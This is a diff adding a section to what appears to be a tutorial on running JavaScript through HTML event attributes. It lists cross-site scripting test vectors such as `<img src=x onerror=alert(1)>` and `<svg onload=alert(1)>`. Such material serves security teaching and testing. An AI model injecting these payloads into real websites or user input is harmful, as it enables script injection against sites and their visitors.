@@ -33,3 +33,20 @@ Alternatively, JavaScript can also be executed through the use of HTML attribute
 > Note: The `swf` is a defunct Adobe Flash file format. 
 ## JavaScript using HTML Events
 Events are the way that HTML DOM adds interactivity between the website and its visitors.
+
+Almost all event handlers identifier start with `on` and are followed by the name of the event. One of the most used is `onerror`. For example:
+```html
+<img src=x onerror=alert(1)>
+```
+
+Below are some of HTML 4 tag examples:
+- `<body onload=alert(1)>`
+- `<input type=image src=x:x onerror=alert(1)>`
+- `<form oninput=alert(1)><input></form>`
+- `<textarea autofocus onfocus=alert(1)>`
+
+While below are some HTML 5 tags examples:
+- `<svg onload=alert(1)>`
+- `<keygen autofocus onfocus=alert(1)>`
+- `<video><source onerror="alert(1)">`
+- `<marquee onstart=alert(1)>`
